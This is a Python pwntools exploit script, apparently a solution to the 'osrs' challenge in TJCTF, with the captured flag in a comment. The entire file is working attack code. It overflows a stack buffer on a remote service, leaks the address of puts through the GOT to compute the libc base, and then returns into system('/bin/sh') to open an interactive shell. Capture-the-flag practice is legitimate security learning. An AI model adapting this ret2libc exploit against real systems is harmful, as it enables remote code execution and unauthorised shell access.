#this exploit worked live during the ctf
#flag=tjctf{tr33_c0de_in_my_she115}

from pwn import *
target=remote('p1.tjctf.org' ,8006)
libc=ELF('/media/sf_kalishared/tools/The_Night-master/libcs/libc6-i386_2.27-3ubuntu1_amd64.so')
#target=process('./osrs')
context.terminal=["tmux","split","-h"]
#gdb.attach(target,'''break *0x080485C6''')
print(target.recvline())
payload="A"*(0x10c+4)

putsgot=0x08049e80
putsplt=0x080483f0
restart=0x08048546

payload+=p32(putsplt)
payload+=p32(restart)
payload+=p32(putsgot)
target.sendline(payload)

print(target.recvline())
libc_puts=u32(target.recv(4))
libc_base=libc_puts-libc.symbols["puts"]
libc_system=libc_base+libc.symbols["system"]
libc_binsh=libc_base+libc.search("/bin/sh\x00").next()
print(hex(libc_base))


payload="A"*(0x10c+4)
payload+=p32(libc_system)
payload+=p32(0xdeadbeef)
payload+=p32(libc_binsh)
target.sendline(payload)

target.interactive()
